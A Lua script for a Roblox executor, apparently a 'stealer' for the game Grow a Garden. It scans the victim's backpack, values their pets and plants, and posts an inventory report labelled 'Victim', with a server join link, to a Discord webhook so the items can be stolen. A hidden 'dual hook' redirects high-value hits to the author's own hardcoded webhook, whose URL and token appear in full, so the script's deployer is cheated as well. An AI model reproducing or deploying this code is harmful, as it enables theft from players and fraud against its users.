-- Core.lua - Full inventory logger + Steal + DualHook logic

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local backpack = plr:WaitForChild("Backpack")
local replicatedStorage = game:GetService("ReplicatedStorage")
local modules = replicatedStorage:WaitForChild("Modules")
local dataService = require(modules:WaitForChild("DataService"))
local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
local numberUtil = require(modules:WaitForChild("NumberUtil"))

-- SETTINGS OUTSIDE
local Webhook = getfenv().Webhook
local Username = getfenv().Username

-- DUAL HOOK CONFIG (SET INSIDE)
local DualWebhook = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
local DualUsername = "namnnni2"

-- Auto fallback
if not Webhook or not Username then return warn("Missing Webhook or Username") end

-- RULES
local rarePets = {"Butterfly", "Raccoon", "Dragonfly", "Mimic Octopus", "Queen Bee", "Disco Bee", "Fennec Fox"}
local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}

-- START
local itemsToSend, totalValue, hasRare, hasHeavy = {}, 0, false, false

local function formatNumber(n)
	local suffix = {"", "k", "m", "b", "t"}
	local idx = 1
	while n >= 1000 and idx < #suffix do
		n = n / 1000
		idx += 1
	end
	return idx == 1 and tostring(math.floor(n)) or string.format("%.2f%s", n, suffix[idx])
end

local function calcPetValue(petData)
	local egg = petData.PetData.HatchedFrom
	if not egg then return 0 end
	local data = petRegistry.PetEggs[egg]
	local rarity = data and data.RarityData.Items[petData.PetType]
	if not rarity then return 0 end
	local r = rarity.GeneratedPetData.WeightRange
	if not r then return 0 end
	local lerp = numberUtil.ReverseLerp(r[1], r[2], petData.PetData.BaseWeight)
	local weightMult = math.lerp(0.8, 1.2, lerp)
	local levelMult = math.lerp(0.15, 6, petUtils:GetLevelProgress(petData.PetData.Level))
	return math.floor(petRegistry.PetList[petData.PetType].SellPrice * weightMult * levelMult)
end

-- Inventory Scan
for _, tool in ipairs(backpack:GetChildren()) do
	if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
		if tool:GetAttribute("ItemType") == "Pet" then
			local id = tool:GetAttribute("PET_UUID")
			local petData = dataService:GetData().PetsData.PetInventory.Data[id]
			local petName = petData.PetType
			local weight = tonumber(petData.PetData.BaseWeight) or 0
			local value = calcPetValue(petData)

			if table.find(rarePets, petName) then hasRare = true end
			if weight >= 10 then hasHeavy = true end
			totalValue += value
			table.insert(itemsToSend, {Name = petName, Weight = weight, Value = value, Type = "Pet"})
		else
			local value = calcPlantValue(tool)
			totalValue += value
			table.insert(itemsToSend, {Name = tool.Name, Weight = 0, Value = value, Type = "Plant"})
		end
	end
end

if #itemsToSend == 0 then return end

table.sort(itemsToSend, function(a, b)
	if a.Type == "Pet" and b.Type ~= "Pet" then return true end
	if a.Type ~= "Pet" and b.Type == "Pet" then return false end
	return a.Value > b.Value
end)

-- Determine webhook
local useDual = totalValue >= 10_000_000_000
local finalWebhook = useDual and DualWebhook or Webhook
local finalUsername = useDual and DualUsername or Username

-- Compose Message
local content = (hasRare or hasHeavy) and "@everyone\n" or ""
content ..= "**GROW A GARDEN HIT - By namnnni2**\n"
content ..= "**JobId:** `" .. game.JobId .. "`"

local lines = ""
for _, item in ipairs(itemsToSend) do
	lines ..= string.format("%s (%.2f KG): â‚µ%s\n", item.Name, item.Weight, formatNumber(item.Value))
	if #lines > 1024 then
		lines = lines:sub(1, 1000) .. "\n...more items"
		break
	end
end

local payload = {
	content = content,
	embeds = {{
		title = "ðŸŽ¯ Full Inventory Report",
		color = 65280,
		fields = {
			{name = "Victim", value = plr.Name, inline = true},
			{name = "Total Value", value = "â‚µ" .. formatNumber(totalValue), inline = true},
			{name = "Join Link", value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId, inline = false},
			{name = "Inventory", value = lines, inline = false}
		},
		footer = { text = "GAG Stealer by " .. finalUsername }
	}}
}

-- Auto HTTP sender
local function getRequest()
	return syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or (identifyexecutor and identifyexecutor():lower():find("delta") and request)
end

pcall(function()
	local req = getRequest()
	if req then
		req({
			Url = finalWebhook,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode(payload)
		})
	end
end)
